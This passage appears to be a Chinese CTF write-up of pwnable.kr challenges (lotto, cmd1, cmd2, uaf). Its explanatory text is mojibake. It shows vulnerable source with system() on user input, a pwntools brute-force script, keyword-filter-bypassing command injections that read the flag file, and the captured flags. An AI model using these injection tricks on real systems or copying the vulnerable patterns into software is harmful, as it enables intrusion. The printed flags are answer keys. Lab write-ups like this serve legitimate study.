punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bet<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>bet <span class="token operator">></span> cash<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player tries to bet more money than player has</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou cannot bet more money than you have."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter Bet: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bet<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> bet<span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">return</span> bet<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span></code></pre><ol><li>ÈÄâÊã©Âú®Á¨¨‰∫åÊ¨°ËæìÂÖ•Êó∂Áõ¥Êé•Ëæì1000000ÔºåÊó†ËÑëËµåÂà∞Ëµ¢</li><li>ÈÄâÊã©Á¨¨‰∏ÄÊ¨°ËæìÂÖ•-1000000ÔºåÊó†ËÑëËµåÂà∞Ëæì</li></ol><p>Âõ†‰∏∫ÊúÄÂêéËÆ°ÁÆóÈáëÈ¢ùÊó∂ÂÄôÔºå‰∏çÊòØ<code>cash = cash + bet;</code>Â∞±ÊòØ<code>cash = cash - bet;</code>ÂàÜÂà´ÂØπÂ∫î‰∏§ÁßçÂà©Áî®</p><h3 id="Ëß£È¢ò-11"><a href="#Ëß£È¢ò-11" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-shell"><code class="language-shell">YaY_I_AM_A_MILLIONARE_LOLCash: $1000500-------|H    ||  2  ||    H|-------Your Total is 2The Dealer Has a Total of 10</code></pre><h2 id="13-lotto"><a href="#13-lotto" class="headerlink" title="13. lotto"></a>13. lotto</h2><h3 id="È¢òÁõÆ-12"><a href="#È¢òÁõÆ-12" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> submit<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Submit your 6 lotto bytes : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> r<span class="token punctuation">;</span>    r <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> submit<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Lotto Start!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//sleep(1);</span>    <span class="token comment" spellcheck="true">// generate lotto numbers</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/urandom"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>fd<span class="token operator">==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"error. tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> lotto<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> lotto<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"error2. tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        lotto<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>lotto<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">45</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 1 ~ 45</span>    <span class="token punctuation">}</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// calculate lotto score</span>    <span class="token keyword">int</span> match <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>lotto<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> submit<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                match<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// win!</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>match <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad luck...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- nLotto Rule -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"nlotto is consisted with 6 random natural numbers less than 46\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"your goal is to match lotto numbers as many as you can\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"if you win lottery for *1st place*, you will get reward\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"for more details, follow the link below\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"mathematical chance to win this game is known to be 1/8145060.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// menu</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> menu<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- Select Menu -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1. Play Lotto\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2. Help\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"3. Exit\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>menu<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>menu<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>                <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>                <span class="token function">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bye\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token punctuation">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"invalid menu\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-12"><a href="#ÂàÜÊûê-12" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>ÂéüÊù•ËøôÈáå‰∏§Â±ÇÂæ™ÁéØÊù•Âà§Êñ≠Êèê‰∫§ÁöÑÂÄºÊòØÂê¶<strong>ÈÉΩ</strong>Âú® lotto ‰∏≠Âá∫Áé∞Ôºå‰ΩÜÊòØÈÄªËæë‰∏äÊòØÊúâÈóÆÈ¢òÁöÑ</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// calculate lotto score</span>    <span class="token keyword">int</span> match <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>lotto<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> submit<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                match<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>ÂÆûÈôÖ‰∏äËøôÊÆµ‰ª£Á†ÅÊòØÊ£ÄÊµãÊèê‰∫§ÁöÑÂÄºÊòØÂê¶Âú® lotto ‰∏≠Âá∫Áé∞ÔºåÂíåÂéüÊù•Êú¨ÊÑèÊúâÂæàÂ§ßÁöÑÂá∫ÂÖ•ÔºåÂõ†‰∏∫Êàë‰ª¨ÂèØ‰ª•ËæìÂÖ• 6 ÂêåÊ†∑ÁöÑÂÄºÔºåÂè™Ë¶Å‰øùËØÅËøô‰∏™ÂÄºÂú® lotto ÈáåÂá∫Áé∞Âç≥ÂèØÂÆåÊàêÁ†¥Ëß£</p><h3 id="Ëß£È¢ò-12"><a href="#Ëß£È¢ò-12" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>conn <span class="token operator">=</span> ssh<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">2222</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">"lotto"</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">"guest"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> conn<span class="token punctuation">.</span>process<span class="token punctuation">(</span>executable<span class="token operator">=</span><span class="token string">"/home/lotto/lotto"</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Exit"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"1"</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bytes :"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bad luck..."</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="14-cmd1"><a href="#14-cmd1" class="headerlink" title="14. cmd1"></a>14. cmd1</h2><h3 id="È¢òÁõÆ-13"><a href="#È¢òÁõÆ-13" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> cmd<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> r<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"sh"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"tmp"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> r<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> envp<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"PATH=/thankyouverymuch"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-13"><a href="#ÂàÜÊûê-13" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><ul><li>strstrÔºöËøîÂõûÂ≠óÁ¨¶‰∏≤str‰∏≠Á¨¨‰∏ÄÊ¨°Âá∫Áé∞Â≠ê‰∏≤substrÁöÑÂú∞ÂùÄÔºõÂ¶ÇÊûúÊ≤°ÊúâÊ£ÄÁ¥¢Âà∞Â≠ê‰∏≤ÔºåÂàôËøîÂõûNULL</li></ul><p>filter ‰∏≠ËøáÊª§‰∫Ü‰∏â‰∏™Â≠óÁ¨¶‰∏≤<code>flag</code>„ÄÅ<code>sh</code>„ÄÅ<code>tmp</code></p><p>‰ΩÜÊòØÔºüÔºüÔºüËøòÊòØÊ≤°ÊòéÁôΩÂíå PATH ÁöÑÂÖ≥Á≥ª</p><h3 id="Ëß£È¢ò-13"><a href="#Ëß£È¢ò-13" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><p>ÈÄöÈÖçÁ¨¶Áõ¥Êé•‰∏äÔºåË∑üÈ¢òÁõÆÊ≤°Â§™Â§ßÂÖ≥Á≥ª</p><pre class=" language-shell"><code class="language-shell">cmd1@pwnable:~$ /home/cmd1/cmd1 "/bin/cat /home/cmd1/f*"mommy now I get what PATH environment is for :)</code></pre><h2 id="15-cmd2"><a href="#15-cmd2" class="headerlink" title="15. cmd2"></a>15. cmd2</h2><h3 id="È¢òÁõÆ-14"><a href="#È¢òÁõÆ-14" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> cmd<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> r<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"="</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"PATH"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"export"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"`"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> r<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">extern</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> environ<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">delete_env</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> p<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>p<span class="token operator">=</span>environ<span class="token punctuation">;</span> <span class="token operator">*</span>p<span class="token punctuation">;</span> p<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">*</span>p<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">*</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> envp<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">delete_env</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"PATH=/no_command_execution_until_you_become_a_hacker"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-14"><a href="#ÂàÜÊûê-14" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>ËøáÊª§Êõ¥ÂΩªÂ∫ïÔºåÊÉ≥ÂäûÊ≥ïÁªï</p><h3 id="Ëß£È¢ò-14"><a href="#Ëß£È¢ò-14" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-shell"><code class="language-shell">cmd2@pwnable:~$ cd /cmd2@pwnable:/$ /home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f???'$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f???FuN_w1th_5h3ll_v4riabl3s_haha</code></pre><h2 id="16-uaf"><a href="#16-uaf" class="headerlink" title="16. uaf"></a>16. uaf</h2><h3 id="È¢òÁõÆ-15"><a href="#È¢òÁõÆ-15" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span> </span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;cstring></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;cstdlib></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>using namespace std<span class="token punctuation">;</span>class Human<span class="token punctuation">{</span>private<span class="token punctuation">:</span>    virtual <span class="token keyword">void</span> <span class="token function">give_shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>protected<span class="token punctuation">:</span>    <span class="token keyword">int</span> age<span class="token punctuation">;</span>    string name<span class="token punctuation">;</span>public<span class="token punctuation">:</span>    virtual <span class="token keyword">void</span> <span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"My name is "</span> <span class="token operator">&lt;&lt;</span> name <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"I am "</span> <span class="token operator">&lt;&lt;</span> age <span class="token operator">&lt;&lt;</span> <span class="token string">" years old"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span>class Man<span class="token punctuation">:</span> public Human<span class="token punctuation">{</span>public<span class="token punctuation">:</span>    <span class="token function">Man</span><span class="token punctuation">(</span>string name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token punctuation">{</span>        this<span class="token operator">-></span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        this<span class="token operator">-></span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        virtual <span class="token keyword">void</span> <span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        Human<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cout <span class="token operator">&lt;&lt;</span> <span class="token string">"I am a nice guy!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span>class Woman<span class="token punctuation">:</span> public Human<span class="token punctuation">{</span>public<span class="token punctuation">:</span>        <span class="token function">Woman</span><span class="token punctuation">(</span>string name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token punctuation">{</span>                this<span class="token operator">-></span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>                this<span class="token operator">-></span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        virtual <span class="token keyword">void</span> <span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        Human<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cout <span class="token operator">&lt;&lt;</span> <span class="token string">"I am a cute girl!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token 